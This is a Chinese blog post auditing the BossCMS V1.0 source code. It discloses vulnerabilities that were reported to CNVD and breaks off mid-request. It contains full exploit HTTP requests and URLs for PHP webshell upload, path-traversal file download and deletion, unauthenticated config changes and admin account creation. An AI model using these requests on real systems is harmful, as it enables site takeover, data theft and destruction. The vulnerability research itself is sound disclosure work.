@@ -1,0 +1,543 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>BossCMSV1.0代码审计 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    BossCMSV1.0代码审计
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-24 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/X7hB2du4e/" class="post-tags">
+                            # 代码审计
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="bosscmsv10代码审计">BossCMSV1.0代码审计</h2>
+<h3 id="前言">前言</h3>
+<p>文章先发于先知社区<a href="https://xz.aliyun.com/t/10804">BossCMSV1.0代码审计</a></p>
+<p>以下漏洞均已提交CNVD并被收录</p>
+<h3 id="后台任意文件上传">后台任意文件上传</h3>
+<p>在后台安全设置处添加允许上传类型.php</p>
+<p>然后通过ueditor的附件上传即可上传php木马文件getshell</p>
+<h4 id="确定位置">确定位置</h4>
+<p>先随意找到上传点，然后抓包上传</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/e4a2a151d20b9af041a2ca28c9a36ea2.png" alt="image-20211228113304296" loading="lazy"></figure>
+<p>修改后缀名发送后得到报错信息</p>
+<pre><code>{&quot;state&quot;:&quot;该文件扩展名不允许上传！&quot;}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/3f3cf2f95698280e4722f448c4aa5be9.png" alt="image-20211228113424096" loading="lazy"></figure>
+<h4 id="审计源码">审计源码</h4>
+<p>通过报错信息定位到源码在/system/basic/class/upload.class.php下</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/4d58ad550cbb5eac53acc95283e0029f.png" alt="image-20211228133202513" loading="lazy"></figure>
+<p>else为结果，那么在if处打上断点</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/416713e855f1e586798c7bff94b884ed.png" alt="image-20211228133313241" loading="lazy"></figure>
+<p>上传php文件开始调试</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/c907fe84579cc821a4e720ac696d8ca6.png" alt="image-20211228133408924" loading="lazy"></figure>
+<p>发现两个条件都不满足</p>
+<ol>
+<li>php后缀名不在$extension中</li>
+<li>!<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo>!</mo><mo>=</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">type!=true也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>type不为null</li>
+</ol>
+<h5 id="第一个条件">第一个条件</h5>
+<p>首先解决第一个问题，在文件29行处可以看到$extension变量值的获取</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/09c576ece81a2bba804d8d92de152c09.png" alt="image-20211228133806544" loading="lazy"></figure>
+<p>那么全局搜索upload_extension，发现他在/system/admin/theme/default/safe.php中获取</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/53876cffb36d1e0b64bc0fd9f3605f25.png" alt="image-20211228133940897" loading="lazy"></figure>
+<p>根据路由规则访问</p>
+<pre><code>http://bosscms/admin/#safe
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/e30d016115eadb2a57d41d74550668c7.png" alt="image-20211228134103461" loading="lazy"></figure>
+<p>存在允许上传类型，那么直接添加.php然后保存，回到源码继续上传.php调试</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/addc3b863f4f220bd39fa5e99cf7c7bb.png" alt="image-20211228134324364" loading="lazy"></figure>
+<p>可以看出这时候$extension数组中多了一个值即.php，成功满足第一个要求</p>
+<h5 id="第二个条件">第二个条件</h5>
+<p>要让!<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo>!</mo><mo>=</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">让</mi></mrow><annotation encoding="application/x-tex">type!=true，也就是让</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">让</span></span></span></span>type=null即可，也就是执行到函数的35行</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/5011db3e14bed934d604d91bad52c214.png" alt="image-20211228134706945" loading="lazy"></figure>
+<p>这里需要满足$ext（.php） 在 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>r</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">继</mi><mi mathvariant="normal">续</mi><mi mathvariant="normal">看</mi></mrow><annotation encoding="application/x-tex">arr 数组中，那么继续看</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">继</span><span class="mord cjk_fallback">续</span><span class="mord cjk_fallback">看</span></span></span></span>arr数组是从</p>
+<pre><code>$G['extension'][$t]中获取的
+</code></pre>
+<p>这里的$t值是photo，获取到的arr为</p>
+<pre><code>&quot;.jpg&quot;, &quot;.gif&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.tif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;, &quot;.webp&quot;
+</code></pre>
+<p>全局搜索得到system/basic/json/extension.json</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/08f157a3edf1c6cbe58efbdb4c823be8.png" alt="image-20211228135832812" loading="lazy"></figure>
+<p>在code键值中看到了我们想要上传的.php</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/499c9d9e7935158beea0f448c198e079.png" alt="image-20211228140005435" loading="lazy"></figure>
+<p>所以的我们的$t应该为code，再回到upload.class.php</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/61e01871df1658a40c7a2ce1db2aa0ca.png" alt="image-20211228140059335" loading="lazy"></figure>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">遍</mi><mi mathvariant="normal">历</mi></mrow><annotation encoding="application/x-tex">t是遍历</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span></span></span></span>arrary获得的，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">割</mi></mrow><annotation encoding="application/x-tex">array是分割</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">割</span></span></span></span>type获得的，可以看到files函数调用时$type默认值是null，那么就是调用时指定code值</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/7a91b9bc39c6a9f1b05ec9d7bd00d09e.png" alt="image-20211228140234323" loading="lazy"></figure>
+<p>跟踪函数，定位到/system/extend/ueditor/php/ueditor.class.php中第246行，调用files函数并且指定了code值</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/4c97d64aa34e7d831313ce404d6a34a0.png" alt="image-20211228140431930" loading="lazy"></figure>
+<p>成功解决了第二个条件</p>
+<h4 id="测试上传">测试上传</h4>
+<p>很明显漏洞存在于ueditor编辑器的附件上传处</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/3a1ecc0085e2ff9fe49e657de3d1e2f3.png" alt="image-20211228140541410" loading="lazy"></figure>
+<p>选择PHP木马文件</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/img_convert/450ee84c16f1e197e3f1b65085eefc9f.png" alt="image-20211228140716011" loading="lazy"></figure>
+<p>上传成功</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/img_convert/f4b9924bda698bb756a8f75addff2bac.png" alt="image-20211228140650473" loading="lazy"></figure>
+<p>点击确认后右键打开新链接获得路径</p>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/img_convert/9e6f6f26226461859f23bb228605543d.png" alt="image-20211228140836613" loading="lazy"></figure>
+<p>成功getshell</p>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/img_convert/d5e6745da25c7dcd8d31ebbdfe3ef8a2.png" alt="image-20211228140922751" loading="lazy"></figure>
+<h3 id="后台任意文件下载">后台任意文件下载</h3>
+<p>后台构造url可以进行任意文件下载</p>
+<pre><code> http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=download&amp;id=../../../index.php
+</code></pre>
+<h4 id="确定位置-2">确定位置</h4>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/img_convert/2804061b062840fbddc13d05cd0542ba.png" alt="image-20211228144943838" loading="lazy"></figure>
+<p>定位到/system/admin/safe/backup.class.php</p>
+<figure data-type="image" tabindex="22"><img src="https://img-blog.csdnimg.cn/img_convert/019efcb0594cbe73d2e4692fe4785ddb.png" alt="image-20211228145013779" loading="lazy"></figure>
+<p>可以看到没有任何过滤，直接通过传值然后下载文件，get传参id值为文件名且可以穿越</p>
+<h4 id="审计源码-2">审计源码</h4>
+<p>全局搜索call_user_func，最后在/system/basic/class/into.class.php的load_class函数中找到可以利用的方法load_class</p>
+<figure data-type="image" tabindex="23"><img src="https://img-blog.csdnimg.cn/img_convert/d7d7bfc19b16d14edf4a97496ba75720.png" alt="image-20211228152321717" loading="lazy"></figure>
+<p>然后就是找调用链</p>
+<p>在/admin/index.php开始</p>
+<figure data-type="image" tabindex="24"><img src="https://img-blog.csdnimg.cn/img_convert/0d0299886822875b394bd0183a28cbb7.png" alt="image-20211228154244245" loading="lazy"></figure>
+<p>再到/system/enter.php</p>
+<figure data-type="image" tabindex="25"><img src="https://img-blog.csdnimg.cn/img_convert/8af333f1089f5de93e65dcce3074b087.png" alt="image-20211228154259276" loading="lazy"></figure>
+<p>/system/basic/class/into.class.php</p>
+<figure data-type="image" tabindex="26"><img src="https://img-blog.csdnimg.cn/img_convert/0e3bdf5c375c770688e1674fb1797682.png" alt="image-20211228154337681" loading="lazy"></figure>
+<p>在执行load_class函数，存在func值成功调用download方法</p>
+<figure data-type="image" tabindex="27"><img src="https://img-blog.csdnimg.cn/img_convert/1e0fb0cbfb124269fb103127c55403f4.png" alt="image-20211228154420129" loading="lazy"></figure>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>l</mi><mi>d</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">mold和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">和</span></span></span></span>part用来拼接文件然后包含一次，然后new 一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>r</mi><mi>t</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">象</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">查</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">象</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">否</mi><mi mathvariant="normal">存</mi><mi mathvariant="normal">在</mi></mrow><annotation encoding="application/x-tex">part对象然后检查是对象中是否存在</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">查</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span></span></span></span>func函数，存在即调用</p>
+<p>所以可以构造url</p>
+<pre><code> http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=download&amp;id=../../../index.php
+</code></pre>
+<p>在load_class方法打上断点然后访问</p>
+<figure data-type="image" tabindex="28"><img src="https://img-blog.csdnimg.cn/img_convert/f528421218c2c0fcfc2b7f704da2a7a7.png" alt="image-20211228154904469" loading="lazy"></figure>
+<p>成功调用download，参数获取正确</p>
+<figure data-type="image" tabindex="29"><img src="https://img-blog.csdnimg.cn/img_convert/f0ce6e9457fd3b888c81c40080d1077a.png" alt="image-20211228155136534" loading="lazy"></figure>
+<p>下载文件成功</p>
+<figure data-type="image" tabindex="30"><img src="https://img-blog.csdnimg.cn/img_convert/9dcc791ba7c3a2ae315f9dd8bbfc7218.png" alt="image-20211228155738916" loading="lazy"></figure>
+<p>且此CMS的数据库信息写在固定文件/system/basic/ini/mysql.ini.php</p>
+<figure data-type="image" tabindex="31"><img src="https://img-blog.csdnimg.cn/img_convert/95fd9f48d35811a0779dc01237902587.png" alt="image-20220102135153075" loading="lazy"></figure>
+<p>可以配合进行敏感信息泄露</p>
+<h3 id="后台任意文件删除">后台任意文件删除</h3>
+<h4 id="确定位置-3">确定位置</h4>
+<p>定位到/system/admin/safe/backup.class.php</p>
+<figure data-type="image" tabindex="32"><img src="https://img-blog.csdnimg.cn/img_convert/8b0d95f65c23e296ca7f3d1dbc584376.png" alt="image-20211228162455126" loading="lazy"></figure>
+<p>还是没有任何过滤，get传参id值为文件名然后调用delete进行删除</p>
+<figure data-type="image" tabindex="33"><img src="https://img-blog.csdnimg.cn/img_convert/bbda3c60ad6466b0c6a81d70a4e52090.png" alt="image-20211228162548323" loading="lazy"></figure>
+<p>使用之前的利用链，先在站点根目录新建test.txt</p>
+<figure data-type="image" tabindex="34"><img src="https://img-blog.csdnimg.cn/img_convert/2a9f5058c2e7ab8bc12d42fb42f362cd.png" alt="image-20211228161326889" loading="lazy"></figure>
+<p>然后根据规则（post：url，get：id）构造请求包</p>
+<p>/system/admin/safe/backup.class.php文件中的delete方法</p>
+<pre><code>POST /admin/?mold=safe&amp;part=backup&amp;func=delete&amp;id=../../../test.txt HTTP/1.1
+Host: bosscms
+Content-Length: 135
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://bosscms
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYe2EcUgaamtd4Xnh
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=table
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryYe2EcUgaamtd4Xnh
+Content-Disposition: form-data; name=&quot;url&quot;
+
+1
+------WebKitFormBoundaryYe2EcUgaamtd4Xnh--
+
+</code></pre>
+<p>成功删除文件</p>
+<figure data-type="image" tabindex="35"><img src="https://img-blog.csdnimg.cn/img_convert/b2d01f3377c44693757da60101b1e2f0.png" alt="image-20211228161255571" loading="lazy"></figure>
+<h3 id="未授权">未授权</h3>
+<h4 id="未授权任意文件下载和删除">未授权任意文件下载和删除</h4>
+<p>对用户是否登录的验证在system/basic/class/admin.class.php文件init函数中</p>
+<figure data-type="image" tabindex="36"><img src="https://img-blog.csdnimg.cn/img_convert/aacb0037646fc409211e458d89ddb408.png" alt="image-20220102143834992" loading="lazy"></figure>
+<p>当判断未登录时通过header进行页面跳转，但是没有exit()或者die()终止程序运行</p>
+<p>所以还是能够得到自己的结果后才跳转（这一点可以在BP中体现）</p>
+<p><strong>在未登录状态下</strong></p>
+<p>先执行删除，成功执行得到结果</p>
+<figure data-type="image" tabindex="37"><img src="https://img-blog.csdnimg.cn/img_convert/b8e3b988c985e820527789f725826750.png" alt="image-20211228163110946" loading="lazy"></figure>
+<p>然后才会重定向到登录页面</p>
+<figure data-type="image" tabindex="38"><img src="https://img-blog.csdnimg.cn/img_convert/4f0d5ba67d554b286e55841a5a6b1825.png" alt="image-20211228163136876" loading="lazy"></figure>
+<p>任意文件下载也是同理，在BP中即可看到跳转前结果</p>
+<h4 id="未授权任意文件上传">未授权任意文件上传</h4>
+<p><strong>通过未授权将之前后台任意文件上传攻击面扩大</strong></p>
+<h5 id="文件上传未授权"><strong>文件上传未授权</strong></h5>
+<pre><code>POST /system/extend/ueditor/php/controller.php?action=uploadfile HTTP/1.1
+Host: bosscms
+Content-Length: 200
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://bosscms
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvwjLJGiYAdfklq31
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryvwjLJGiYAdfklq31
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.php&quot;
+Content-Type: image/png
+
+&lt;?php phpinfo();?&gt;
+------WebKitFormBoundaryvwjLJGiYAdfklq31--
+
+</code></pre>
+<figure data-type="image" tabindex="39"><img src="https://img-blog.csdnimg.cn/img_convert/fe2ac29a6a0370d21f01229e61eb61ce.png" alt="image-20211229080206123" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://img-blog.csdnimg.cn/img_convert/924114f427a124105cb46b254298d214.png" alt="image-20211229080217934" loading="lazy"></figure>
+<h5 id="修改上传配置点未授权">修改上传配置点未授权</h5>
+<p>找到可利用的函数/system/admin/safe/safe.class.php文件中的add函数，参数可控</p>
+<figure data-type="image" tabindex="41"><img src="https://img-blog.csdnimg.cn/img_convert/0b297edc4d6f5364d8f5f06f9b0968a8.png" alt="image-20211228203210065" loading="lazy"></figure>
+<p>还是之间的链，根据代码构造请求，在post请求中upload_extension数组里添加.php键值</p>
+<pre><code>POST /admin/?mold=safe&amp;part=safe&amp;func=add HTTP/1.1
+Host: bosscms
+Content-Length: 987
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://bosscms
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLNKwhkxPkcJiHO5I
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://bosscms/admin/?mold=safe&amp;part=safe&amp;func=init&amp;lang=1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;admin_folder&quot;
+
+admin
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;admin_login_captcha&quot;
+
+1
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;admin_logout_time&quot;
+
+28888
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;page_cache_time&quot;
+
+0
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;upload_rename&quot;
+
+1
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;upload_maxsize&quot;
+
+2
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;upload_extension&quot;
+
+[&quot;.jpg&quot;,&quot;.png&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.mp4&quot;,&quot;.mp3&quot;,&quot;.pdf&quot;,&quot;.doc&quot;,&quot;.xls&quot;,&quot;.xlsx&quot;,&quot;.bmp&quot;,&quot;.csv&quot;,&quot;.ico&quot;,&quot;.JPG&quot;,&quot;.php&quot;]
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I
+Content-Disposition: form-data; name=&quot;ueditor_catchimage&quot;
+
+0
+------WebKitFormBoundaryLNKwhkxPkcJiHO5I--
+
+</code></pre>
+<p>成功未授权修改配置</p>
+<figure data-type="image" tabindex="42"><img src="https://img-blog.csdnimg.cn/img_convert/b2dafb3f69b0007ddea7c4432d148801.png" alt="image-20211228203643857" loading="lazy"></figure>
+<p>修改配置之后可以未授权任意文件上传了</p>
+<figure data-type="image" tabindex="43"><img src="https://img-blog.csdnimg.cn/img_convert/e8804739144ee3719b154c302351cda0.png" alt="image-20211229080131093" loading="lazy"></figure>
+<p>成功访问执行</p>
+<figure data-type="image" tabindex="44"><img src="https://img-blog.csdnimg.cn/img_convert/ae1a53f80d88905da4c4dba593deead2.png" alt="image-20211229080253060" loading="lazy"></figure>
+<h4 id="未授权用户操作">未授权用户操作</h4>
+<p>用户操作相对于来说也算敏感操作，就顺带写了</p>
+<h5 id="确定位置-4">确定位置</h5>
+<p>定位到/system/admin/manager/manager.class.php</p>
+<p>其中的add,edit,delete三个函数参数都是由请求获得的（可控的）</p>
+<figure data-type="image" tabindex="45"><img src="https://img-blog.csdnimg.cn/img_convert/54b40d7a274fee172eed793507b62e4d.png" alt="image-20211229083543737" loading="lazy"></figure>
+<p>根据规则构造请求包，以下为关键点</p>
+<pre><code>mold=manager&amp;part=manager&amp;func=add 
+/system/admin/manager/manager.class.php中的add函数
+
+POST传参
+username-用户名
+password-密码
+password-确认密码
+level-权限 （2为系统管理员）
+</code></pre>
+<p>请求包</p>
+<pre><code>POST /admin/?mold=manager&amp;part=manager&amp;func=add HTTP/1.1
+Host: bosscms
+Content-Length: 1959
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://bosscms
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB067fgIWBKtHI4Gy
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://bosscms/admin/?mold=manager&amp;part=manager&amp;func=edit
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;username&quot;
+
+123
